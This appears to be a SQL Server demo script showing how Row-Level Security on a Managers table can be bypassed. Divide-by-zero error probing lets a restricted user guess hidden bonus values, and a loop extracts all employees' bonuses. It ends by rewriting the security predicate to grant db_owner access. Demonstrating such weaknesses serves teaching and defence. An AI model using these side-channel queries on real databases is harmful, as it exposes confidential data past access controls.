-- RLS doesn't grant dbo access to any rows...
SELECT USER_NAME()
SELECT *
FROM dbo.Managers

-- Guess right, win a Divide By Zero!
SELECT *
FROM dbo.Managers
WHERE EmployeeID = 188
AND 1/(Bonus - 10000.00) = 0

-- Most likely won't guess right the first time so
-- Lets loop through some values
declare @Bonus int = 9950
WHILE @Bonus < 10005
BEGIN
	BEGIN TRY
		SELECT *
		FROM dbo.Managers
		WHERE EmployeeID = 188
		AND 1/(Bonus - CAST(@Bonus AS money)) = 0
	END TRY
	BEGIN CATCH
			PRINT 'Bingo the Bonus is '+CAST(@Bonus AS VARCHAR(200))
			
	END CATCH
select @Bonus = @Bonus+1
END
GO
-- Now lets get everyones bonus!
declare @EmployeeId int = 2
declare @Bonus int = 9950
declare @BonusTable TABLE (EmployeeID INT, Bonus MONEY)

WHILE @EmployeeId < 165
BEGIN
	WHILE @Bonus < 10005 AND @EmployeeID NOT IN (SELECT EmployeeID FROM @BonusTable)
	BEGIN
		BEGIN TRY
			INSERT INTO @BonusTable (EmployeeID, Bonus)
			SELECT EmployeeID, Bonus 
			FROM dbo.Managers
			WHERE EmployeeID = @EmployeeId
			AND 1/(Bonus - CAST(@Bonus AS money)) = 0
		END TRY
		BEGIN CATCH
				--PRINT 'Bingo the Bonus is '+CAST(@Bonus AS VARCHAR(200))
				INSERT INTO @BonusTable (EmployeeID, Bonus)
				SELECT @EmployeeId, CAST(@Bonus AS money)
		END CATCH
	select @Bonus = @Bonus+1
	END
	SELECT @EmployeeId +=1
	SELECT @Bonus = 9950

END
-- Here are all the employees bonuses
SELECT *
FROM @BonusTable
GO

-- Again... we cannot see any rows from dbo.Managers
-- but we could side attack to get the data.
SELECT USER_NAME()
SELECT *
FROM dbo.Managers

-- Lets add db_owners access to see all rows...
DROP SECURITY POLICY RLS.SecurityPolicy_ManagerID_Managers 
GO

CREATE OR ALTER FUNCTION RLS.AccessPredicate_ManagerID_Managers(@Region NVARCHAR(256))
RETURNS TABLE
WITH SCHEMABINDING
AS
RETURN
    -- add dbo to acess all rows
	SELECT 1 AS AccessResult
	WHERE IS_MEMBER('db_owner') = 1
	UNION
	SELECT ISNULL (AccessResult, 0) AS AccessResult
	FROM (
		SELECT 1 AccessResult
		FROM dbo.Managers M
		WHERE m.Region = @Region
		AND IS_ROLEMEMBER(M.Region,USER_NAME())=1 ) AS AccessPred
GO

CREATE SECURITY POLICY RLS.SecurityPolicy_ManagerID_Managers
ADD FILTER PREDICATE RLS.AccessPredicate_ManagerID_Managers(Region) ON dbo.Managers
,ADD BLOCK PREDICATE RLS.AccessPredicate_ManagerID_Managers(Region) ON dbo.Managers AFTER UPDATE
WITH (STATE = ON, SCHEMABINDING = ON)
GO

-- Now we can see the rows...
SELECT USER_NAME()
SELECT *
FROM dbo.Managers